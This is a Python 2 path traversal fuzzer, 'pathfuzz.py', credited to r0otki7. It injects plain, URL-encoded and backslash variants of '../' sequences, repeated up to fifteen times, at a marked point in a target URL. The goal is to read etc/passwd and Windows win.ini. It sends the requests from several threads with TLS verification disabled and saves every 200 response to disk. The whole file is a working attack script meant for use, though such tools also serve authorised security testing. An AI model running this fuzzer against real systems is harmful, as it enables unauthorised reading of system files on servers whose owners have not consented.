#!/usr/bin/python
#************************************************************
#pathfuzz.py: Fuzzing script for Path Traversal.
#************************************************************
#Written by r0otki7 <https://github.com/r0otki7/>
#************************************************************

import requests
import urllib
import threading
import Queue
import sys
import time

#Creating the queue
q = Queue.Queue(maxsize=0)
q_thread = 5

#Taking input and initializing lists
if len(sys.argv) < 2:
    sys.exit("Usage: "+sys.argv[0]+" <url>")
else:
    url = sys.argv[1]
if str(url).find("*") == -1:
    sys.exit("No custom injection point found, Exiting...")
dbg = int(raw_input("Enter Debug Level (1-2): "))
if dbg not in range(1,3):
    sys.exit("Dbg value can only be 1 or 2")
payloads = ["etc/passwd","C:/Windows/win.ini","C:\Windows\win.ini"]
url_list = []

#Opening the common files for debug level 1 & 2
f = open("statuslog.txt", "w")
f1 = open("any200.txt", "w")

#Opening the file for debug level 2
if dbg == 2:
    f2 = open("extensivelog.txt", "w")

#The function which is taking input from the queue and performing actions on it.
def queue_url(q):
    while True:
        try:
            r = requests.get(q.get(), timeout=30, verify=False)
            r_url = r.url.encode('utf-8')
            r_status = str(r.status_code)
            print r_url+"\t"+r_status
            if dbg == 2:
                f2.write("URL: "+r_url+"\nStatus Code: "+r_status+"\nResponse:\n"+r.text.encode('utf-8')+"\n\n\n==================================================================\n\n\n")
            f.write("URL: "+r_url+"\n"+"Status Code: "+r_status+"\n\n\n")
            if r_status == "200":
                f1.write("URL: "+r_url+"\n"+"Response:\n"+r.text.encode('utf-8')+"\n\n\n==================================================================\n\n\n")
            q.task_done()
        except requests.exceptions.Timeout:
            print "Request Timed out"
        except requests.exceptions.ConnectionError:
            print "Connection Resetted"

#The main function for creating threads and queues.
def main():
    #Generating payloads here
    print "Custom Character * found in URL, treating it as the injection point"
    for items in payloads:
        for i in range(0,16):
            url_list.append(str(url).replace("*","../"*i+items))
            url_list.append(str(url).replace("*",(urllib.quote("../", safe='')*i+items)))
            url_list.append(str(url).replace("*","../"*i+urllib.quote(items, safe='')))
            url_list.append(str(url).replace("*",(urllib.quote(("../")*i+items, safe=''))))
            url_list.append(str(url).replace("*","..\\"*i+items))
            url_list.append(str(url).replace("*",(urllib.quote("..\\", safe='')*i+items)))
            url_list.append(str(url).replace("*","..\\"*i+urllib.quote(items, safe='')))
            url_list.append(str(url).replace("*",(urllib.quote(("..\\")*i+items, safe=''))))
    
#Creating the threads here, taking in the items from the queue        
    for j in range(q_thread):
        threads = threading.Thread(target=queue_url, args=(q,))
        threads.setDaemon(True)
        threads.start()
    
#Putting the items in queue here
    for url_param in url_list:
        try:
            time.sleep(0.5)     #Adjust this accordingly to throttle requests.
            q.put(url_param)
        except KeyboardInterrupt:
            sys.exit("\nExiting...")
    q.join()


if __name__=='__main__':
        main()
